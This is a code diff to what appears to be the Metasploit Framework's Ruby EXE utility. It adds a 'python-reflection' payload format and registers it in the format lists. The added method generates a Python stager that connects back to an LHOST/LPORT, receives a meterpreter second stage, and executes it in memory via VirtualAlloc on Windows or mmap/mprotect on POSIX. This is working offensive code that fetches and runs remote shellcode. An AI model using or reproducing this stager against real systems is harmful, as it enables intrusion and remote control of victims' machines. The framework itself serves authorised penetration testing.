@@ -1437,6 +1437,57 @@ require 'msf/core/exe/segment_appender'
     read_replace_script_template("to_powershell.hta.template", hash_sub)
   end
 
+  def self.to_python_reflection(framework, arch, code, exeopts)
+    if arch != ARCH_X64 and arch != ARCH_X86
+      raise RuntimeError, "Msf::Util::EXE.to_python_reflection is not compatible with #{arch}"
+    end
+    python_code = 'import ctypes,os'
+    load_socket_nt = ''
+    load_socket_posix = ''
+    payload = exeopts[:payload]
+    if payload.end_with?('meterpreter/reverse_tcp')
+      if not exeopts[:lhost] and exeopts[:lport]
+        raise RuntimeError, 'Msf::Util::EXE.to_python_reflection called without LHOST and LPORT'
+      end
+      python_code += ",socket,struct
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('#{exeopts[:lhost]}',#{exeopts[:lport]}))
+buf = b'\\xbf'+struct.pack('<L', s.fileno())
+"
+      load_socket_nt = "
+  stagelen = struct.unpack('<L', s.recv(4))[0]
+  while stagelen>0:
+    chunk = s.recv(stagelen)
+    if chunk == '':
+        break
+    buf += bytearray(chunk)
+    stagelen -= len(chunk)"
+      load_socket_posix = "
+  buf += s.recv(4096)"
+    else
+      python_code += "\n" + Rex::Text.to_python(code)
+    end
+    python_code += %(if os.name == 'nt':#{load_socket_nt}
+  cbuf = (ctypes.c_char * len(buf)).from_buffer_copy(buf)
+  ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
+  ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_long(0),ctypes.c_long(len(buf)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
+  ctypes.windll.kernel32.RtlMoveMemory.argtypes = [ctypes.c_void_p,ctypes.c_void_p,ctypes.c_int]
+  ctypes.windll.kernel32.RtlMoveMemory(ptr,cbuf,ctypes.c_int(len(buf)))
+  ctypes.CFUNCTYPE(ctypes.c_int)(ptr)()
+else:#{load_socket_posix}
+  import mmap
+  from ctypes.util import find_library
+  c = ctypes.CDLL(find_library('c'))
+  c.mmap.restype = ctypes.c_void_p
+  ptr = c.mmap(0,len(buf),mmap.PROT_READ|mmap.PROT_WRITE,mmap.MAP_ANONYMOUS|mmap.MAP_PRIVATE,-1,0)
+  ctypes.memmove(ptr,buf,len(buf))
+  c.mprotect.argtypes = [ctypes.c_void_p,ctypes.c_int,ctypes.c_int]
+  c.mprotect(ptr,len(buf),mmap.PROT_READ|mmap.PROT_EXEC)
+  ctypes.CFUNCTYPE(ctypes.c_int)(ptr)()
+)
+    python_code
+  end
+
   def self.to_jsp(exe)
     hash_sub = {}
     hash_sub[:var_payload]       = Rex::Text.rand_text_alpha(rand(8)+8)
@@ -2269,6 +2320,8 @@ require 'msf/core/exe/segment_appender'
       Msf::Util::EXE.to_powershell_command(framework, arch, code)
     when 'hta-psh'
       Msf::Util::EXE.to_powershell_hta(framework, arch, code)
+    when 'python-reflection'
+      Msf::Util::EXE.to_python_reflection(framework, arch, code, exeopts)
     end
   end
 
@@ -2300,6 +2353,7 @@ require 'msf/core/exe/segment_appender'
       "psh-cmd",
       "psh-net",
       "psh-reflection",
+      "python-reflection",
       "vba",
       "vba-exe",
       "vba-psh",
